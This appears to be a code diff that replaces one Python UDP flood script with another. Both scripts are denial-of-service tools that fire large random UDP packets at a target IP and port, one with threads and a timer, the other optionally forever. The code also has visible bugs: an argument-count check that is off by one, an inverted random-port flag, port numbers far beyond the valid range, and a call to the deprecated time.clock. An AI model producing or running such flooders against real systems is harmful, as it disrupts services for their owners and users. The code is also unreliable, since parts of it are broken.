@@ -1,47 +1,24 @@
-import socket
-import sys, os
-import threading
-import time
-import random
-
-if len(sys.argv) < 5:
-  sys.exit("> Usage: python "+sys.argv[0]+" <ip> <port> <packet> <threads> <time>")
-
-ip = str(sys.argv[1])
-port = int(sys.argv[2])
-packet = int(sys.argv[3])
-threads = int(sys.argv[4])
-times = float(sys.argv[5])
-
-timeout = time.time() + 1 * times
-
-def udp(ip, port, packet, times):
-  timeout = time.time() + 1 * times
-  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
-  print(f"Attack Kepada > {ip}:{port} Waktu {times}")
-  while time.time() < timeout:
-    try:
-      try:
-        data = random._urandom(int(random.randint(1025, 65505)))
-        for _ in range(packet):
-          s.sendto(data, (str(ip), int(port)))
-      except:
-        s.close()
-    except:
-      s.close()
-  print("Flooding > end")
-
-def main():
-  global threads
-  for _ in range(threads):
-    thread = []
-    th = threading.Thread(target=udp, args=(ip, port, packet, times))
-    thread.append(th)
-    th.start()
-
-if __name__ == '__main__':
-  try:
-    main()
-  except KeyboardInterrupt:
-    print('\nBye Byee')
-    sys.exit()
+#!/usr/bin/python
+import socket,random,sys,time
+ 
+if len(sys.argv)==1:
+    sys.exit('Usage: udp.py ip port(0=random) length(0=forever)')
+ 
+def UDPFlood():
+    port = int(sys.argv[2])
+    randport=(True,False)[port==0]
+    ip = sys.argv[1]
+    dur = int(sys.argv[3])
+    clock=(lambda:0,time.clock)[dur>0]
+    duration=(1,(clock()+dur))[dur>0]
+    print('ZxC-UDP: %s:%s for %s seconds'%(ip,port,dur or 'infinite'))
+    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    bytes=random._urandom(65500)
+    while True:
+        port=(random.randint(1,15000000),port)[randport]
+        if clock()<duration:
+            sock.sendto(bytes,(ip,port))
+        else:
+            break
+    print('DONE')
+UDPFlood()
